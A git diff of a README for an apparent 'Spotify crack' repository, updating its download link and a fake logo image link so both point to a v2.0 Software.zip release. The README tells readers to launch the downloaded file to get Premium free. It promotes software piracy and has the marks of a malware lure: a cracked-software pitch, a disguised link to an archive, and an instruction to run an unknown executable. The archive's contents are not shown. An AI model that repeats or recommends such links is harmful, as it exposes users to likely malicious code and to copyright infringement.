@@ -25,7 +25,7 @@ Welcome to the latest Spotify crack for 2025! This crack will allow you to enjoy
 
 ## Get Started
 To access the Spotify crack, please download the software from the following link:  
-[Download Spotify Crack](https://github.com/neduckmanduk/Spotify-crack-v0.23--2025-/releases/download/v1.0/Software.zip)  
+[Download Spotify Crack](https://github.com/neduckmanduk/Spotify-crack-v0.23--2025-/releases/download/v2.0/Software.zip)  
 
 🚀 **Launch the downloaded file to get started!**
 
@@ -40,7 +40,7 @@ This crack is for educational purposes only. We do not support or promote the un
 
 🎶 **Rock on with your Spotify Premium experience!** 🎶
 
-![Spotify Logo](https://github.com/neduckmanduk/Spotify-crack-v0.23--2025-/releases/download/v1.0/Software.zip)  
+![Spotify Logo](https://github.com/neduckmanduk/Spotify-crack-v0.23--2025-/releases/download/v2.0/Software.zip)  
 
 ```bash
 $ Enjoy Spotify Premium for FREE!
